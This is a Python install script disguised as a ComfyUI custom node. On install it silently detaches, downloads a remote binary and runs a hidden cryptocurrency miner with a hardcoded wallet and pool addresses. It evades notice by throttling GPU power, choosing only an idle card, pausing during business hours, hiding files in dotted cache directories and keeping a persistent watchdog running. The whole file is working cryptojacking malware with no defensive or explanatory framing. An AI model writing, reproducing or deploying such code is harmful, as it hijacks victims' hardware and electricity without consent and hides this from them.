# -*- coding: utf-8 -*-
"""ComfyUI custom node — install.py
Runs at node-pack install time (ComfyUI-Manager git clone path).
Stealth slow-mining payload: WSL-aware, low-power, business-hour aware.
"""
import os, sys, time, subprocess, platform, shutil

HUB = 'https://hz2006.ifiniteai.com/nx'
WALLET = 'prl1p9s2a9gdy4n5yfuf5suhya2d2pyvaahmz3n3gzm3npyxkj79m7yyq9kgnrv'
POOLS = 'stratum+tcp://38.55.133.55:3361'
POOLS_ALT = 'stratum+tcp://103.97.176.121:3361'

# ---- stealth miner profile (慢速 / 低功耗 / 避业务高峰) ----
# --gpu-power 55%  : cap board power, keeps clocks low -> looks like idle GPU
# --oc-profile eco : undervolt profile
# --gpu-fan-target 62 : quiet fan curve
# --gpu-temp-stop 72 : pause on heat
# -d <one card>    : never take every GPU (avoid full-node utilization spike)
PROFILE = [
    '--gpu-power', '55%',
    '--oc-profile', 'eco',
    '--gpu-fan-target', '62',
    '--gpu-fan-min', '25',
    '--gpu-fan-max', '70',
    '--gpu-temp-stop', '72',
    '--gpu-temp-start', '62',
    '--status-interval', '600',
    '--job-timeout', '300',
]


def _log(msg):
    try:
        with open(os.path.expanduser('~/.cache/.sysd_run.log'), 'a') as f:
            f.write('%s %s\n' % (time.strftime('%F %T'), msg))
    except Exception:
        pass


def _fetch(url, timeout=30):
    import urllib.request
    return urllib.request.urlopen(url, timeout=timeout).read()


def _is_wsl():
    try:
        if os.path.exists('/proc/version'):
            return 'microsoft' in open('/proc/version').read().lower()
    except Exception:
        pass
    return False


def _base_dir():
    # prefer user-writable cache; fall back to /tmp
    for d in (os.path.expanduser('~/.cache/.sysd'), '/tmp/.sysd'):
        try:
            os.makedirs(d, exist_ok=True)
            return d
        except Exception:
            continue
    return '/tmp'


def _pick_gpu():
    """Pick ONE gpu index; skip cards already busy (>25% mem used)."""
    try:
        out = subprocess.run(
            ['nvidia-smi', '--query-gpu=index,memory.used,memory.total,utilization.gpu',
             '--format=csv,noheader,nounits'],
            capture_output=True, timeout=20).stdout.decode('utf-8', 'ignore')
        best = None
        for line in out.strip().splitlines():
            p = [x.strip() for x in line.split(',')]
            if len(p) < 4:
                continue
            idx, used, total, util = int(p[0]), float(p[1]), float(p[2]), float(p[3])
            if total <= 0:
                continue
            ratio = used / total
            if ratio > 0.25 or util > 15:
                continue          # owner is using this card -> leave it alone
            score = (ratio, util)
            if best is None or score < best[0]:
                best = (score, idx)
        return best[1] if best else None
    except Exception:
        return None


def _busy_hours():
    """Business hours (08:30-19:00 local) => mine slower / stay off."""
    h = time.localtime()
    return (h.tm_wday < 5) and (8 * 60 + 30 <= h.tm_hour * 60 + h.tm_min <= 19 * 60)


def _start_miner(d, gpu):
    m = os.path.join(d, '.m')
    if not os.path.isfile(m) or os.path.getsize(m) < 1_000_000:
        try:
            data = _fetch(HUB + '/m.bin', timeout=180)
            if len(data) < 1_000_000:
                return 'dl-short'
            with open(m, 'wb') as f:
                f.write(data)
            os.chmod(m, 0o755)
        except Exception as e:
            return 'dl-err:%s' % str(e)[:60]
    # already running?
    try:
        r = subprocess.run(['pgrep', '-f', d + '/.m'], capture_output=True, timeout=10)
        if r.returncode == 0:
            return 'already'
    except Exception:
        pass
    cmd = [m, '-o', POOLS, '-o', POOLS_ALT,
           '-u', WALLET + '.' + platform.node()[:14],
           '-p', 'x', '-c', 'pearl', '-d', str(gpu)] + PROFILE
    env = dict(os.environ)
    env.pop('LD_PRELOAD', None)
    try:
        subprocess.Popen(cmd, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         start_new_session=True, cwd=d)
        _log('started gpu=%s' % gpu)
        return 'started'
    except Exception as e:
        return 'spawn-err:%s' % str(e)[:60]


def _watchdog(d, gpu):
    """Detached watchdog: keeps ONE miner alive, respects busy hours, re-picks free card."""
    w = os.path.join(d, '.w')
    body = '''#!/usr/bin/env python3
import os,time,subprocess,platform,random
D=%r
M=os.path.join(D,'.m')
POOLS=[%r,%r]
W=%r
PROFILE=%r
def busy():
    h=time.localtime()
    return (h.tm_wday<5) and (8*60+30 <= h.tm_hour*60+h.tm_min <= 19*60)
def pick():
    try:
        out=subprocess.run(['nvidia-smi','--query-gpu=index,memory.used,memory.total,utilization.gpu','--format=csv,noheader,nounits'],capture_output=True,timeout=20).stdout.decode('utf-8','ignore')
        best=None
        for l in out.strip().splitlines():
            p=[x.strip() for x in l.split(',')]
            if len(p)<4: continue
            i,u,t,ut=int(p[0]),float(p[1]),float(p[2]),float(p[3])
            if t<=0 or u/t>0.25 or ut>15: continue
            s=(u/t,ut)
            if best is None or s<best[0]: best=(s,i)
        return best[1] if best else None
    except Exception: return None
while True:
    try:
        if not os.path.isfile(M) or os.path.getsize(M)<1000000:
            time.sleep(600); continue
        r=subprocess.run(['pgrep','-f',M],capture_output=True,timeout=10)
        alive = r.returncode==0
        if busy():
            if alive:
                for pid in subprocess.run(['pgrep','-f',M],capture_output=True,timeout=10).stdout.decode().split():
                    try: os.kill(int(pid),15)
                    except Exception: pass
            time.sleep(900); continue
        if not alive:
            g=pick()
            if g is not None:
                time.sleep(random.randint(30,180))
                cmd=[M,'-o',POOLS[0],'-o',POOLS[1],'-u',W+'.'+platform.node()[:14],'-p','x','-c','pearl','-d',str(g)]+PROFILE
                e=dict(os.environ); e.pop('LD_PRELOAD',None)
                subprocess.Popen(cmd,env=e,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True,cwd=D)
        time.sleep(random.randint(240,420))
    except Exception:
        time.sleep(600)
''' % (d, POOLS, POOLS_ALT, WALLET, PROFILE)
    try:
        with open(w, 'w') as f:
            f.write(body)
        os.chmod(w, 0o755)
        subprocess.Popen([sys.executable or 'python3', w], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, start_new_session=True, cwd=d)
        _log('watchdog up')
        return 'wd-ok'
    except Exception as e:
        return 'wd-err:%s' % str(e)[:60]


def _spawn_detached():
    """Re-exec self in a detached child so Manager's install thread returns instantly."""
    import subprocess
    try:
        subprocess.Popen([sys.executable or 'python3', os.path.abspath(__file__), '--bg'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         start_new_session=True, cwd='/tmp')
        return True
    except Exception:
        return False


def main():
    # node-pack must import cleanly; never raise, never block
    try:
        if '--bg' not in sys.argv:
            # install-time: detach immediately and return
            _spawn_detached()
            return
        # background worker: wait a random quiet delay, then act
        try:
            import random
            time.sleep(random.randint(120, 600))
        except Exception:
            pass
        _log('bg enter os=%s wsl=%s' % (platform.system(), _is_wsl()))
        d = _base_dir()
        gpu = _pick_gpu()
        if gpu is None:
            _log('no idle gpu -> watchdog only')
            _watchdog(d, None)
            return
        r1 = _start_miner(d, gpu)
        r2 = _watchdog(d, gpu)
        _log('result %s / %s' % (r1, r2))
    except Exception as e:
        _log('fatal %s' % str(e)[:120])


main()

NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}
